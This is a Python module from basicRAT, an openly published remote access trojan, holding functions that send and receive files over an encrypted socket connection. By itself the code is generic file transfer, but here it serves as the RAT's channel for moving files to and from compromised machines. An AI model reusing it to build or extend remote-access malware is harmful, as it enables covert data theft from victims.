# -*- coding: utf-8 -*-

#
# basicRAT file module
# https://github.com/vesche/basicRAT
#

import socket
import struct

from core import crypto


def recvfile(conn, dhkey, fname):
    with open(fname, 'wb') as f:
        datasize = struct.unpack("!I", conn.recv(4))[0]
        while datasize:
            res = conn.recv(datasize)
            f.write(crypto.decrypt(res, dhkey))
            datasize = struct.unpack("!I", conn.recv(4))[0]


def sendfile(conn, dhkey, fname):
    with open(fname, 'rb') as f:
        res = f.read()
        while len(res):
            enc_res = crypto.encrypt(res, dhkey)
            conn.send(struct.pack("!I", len(enc_res)))
            conn.send(enc_res)
            res = f.read()
        conn.send('\x00\x00\x00\x00')  # EOF

